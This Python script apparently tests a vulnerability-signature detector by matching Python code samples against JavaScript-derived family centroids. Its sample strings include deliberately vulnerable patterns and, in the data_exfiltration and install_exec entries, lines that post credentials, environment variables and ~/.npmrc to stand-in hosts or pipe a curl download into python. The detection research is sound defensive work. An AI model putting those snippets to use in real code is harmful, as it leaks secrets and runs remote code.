#!/usr/bin/env python3
"""Cross-language test: sign Python examples of behaviors and match them against the
JavaScript-derived family centroids in database.json. If a Python behavior lands on the
centroid trained from JavaScript, the signature is keyed on behavior, not on language.
"""
from __future__ import annotations
import sys, json
from pathlib import Path
import numpy as np
ROOT = Path(__file__).resolve().parent
sys.path.insert(0, str(ROOT.parent / "engine"))
from precollapse.signature import ModelBackend, cosine  # noqa: E402

# Python examples for the families that have a direct Python analog.
PY = {
"command_injection": [
 'import os\ndef ping(host): os.system("ping -c 1 " + host)',
 'import subprocess\ndef lookup(t): subprocess.run("nslookup " + t, shell=True)',
 'import subprocess\ndef listing(a): return subprocess.check_output("tar -tf " + a, shell=True)'],
"code_injection_eval": [
 'def compute(expr): return eval(expr)',
 'def build(src): exec(src)',
 'def run(code): exec(compile(code, "<in>", "exec"))'],
"path_traversal": [
 'def read(name): return open("./uploads/" + name).read()',
 'import os\ndef serve(f): return open(os.path.join("/var/data", f)).read()',
 'def load(p): return open("public/" + p).read()'],
"unsafe_deserialization": [
 'import pickle\ndef restore(b): return pickle.loads(b)',
 'import yaml\ndef parse(s): return yaml.load(s, Loader=yaml.Loader)',
 'import pickle, base64\ndef hydrate(p): return pickle.loads(base64.b64decode(p))'],
"server_side_request_forgery": [
 'import requests\ndef proxy(url): return requests.get(url).text',
 'import urllib.request\ndef grab(t): return urllib.request.urlopen(t).read()',
 'import requests\ndef relay(u): return requests.get(u).content'],
"weak_crypto": [
 'import hashlib\ndef h(p): return hashlib.md5(p).hexdigest()',
 'import hashlib\ndef fp(x): return hashlib.sha1(x).hexdigest()',
 'import random\ndef token(): return str(random.random())'],
"hardcoded_secret": [
 'AWS_KEY = "AKIA_REDACTED_EXAMPLE_ID"\nAWS_SECRET = "REDACTED_example_secret_access_key"',
 'config = {"api_token": "ghp_REDACTED_EXAMPLE_TOKEN", "db_password": "example_prod_redacted"}',
 'STRIPE_SECRET = "sk_live_REDACTED_EXAMPLE_KEY"\ndef client(): return {"key": STRIPE_SECRET}'],
"data_exfiltration": [
 'import os, requests\ndef grab(): requests.post("https://collect.example", json={k: os.environ.get(k) for k in ["NPM_TOKEN","AWS_SECRET_ACCESS_KEY"]})',
 'import os, requests\ndef steal(): requests.post("https://drop.example", data=open(os.path.expanduser("~/.npmrc")).read())',
 'import os, requests\ndef env(): requests.post("https://exfil.example", json=dict(os.environ))'],
"install_exec": [
 'import subprocess\nsubprocess.Popen(["python", "./setup_stage2.py"])',
 'import os\nos.system("python ./postinstall.py")',
 'import subprocess\nsubprocess.call("curl -s https://stage.example/p | python -", shell=True)'],
}

def main():
    db = json.loads((ROOT / "database.json").read_text())
    cent = {f["family"]: np.asarray(f["centroid"], dtype=np.float64) for f in db["families"]}
    print(f"matching Python behaviors against {len(cent)} JavaScript-derived centroids\n")
    mb = ModelBackend("microsoft/phi-1_5", device="cpu")
    correct = tot = 0
    for fam, examples in PY.items():
        hits = 0
        for code in examples:
            v = mb.encode(code)
            pred = max(cent, key=lambda f: cosine(v, cent[f]))
            hits += (pred == fam); tot += 1
        correct += hits
        print(f"  {fam:32s} {hits}/{len(examples)}  Python -> JS centroid")
    print(f"\ncross-language (Python -> JavaScript centroid): {correct}/{tot} = {correct/tot:.1%}")

if __name__ == "__main__":
    main()
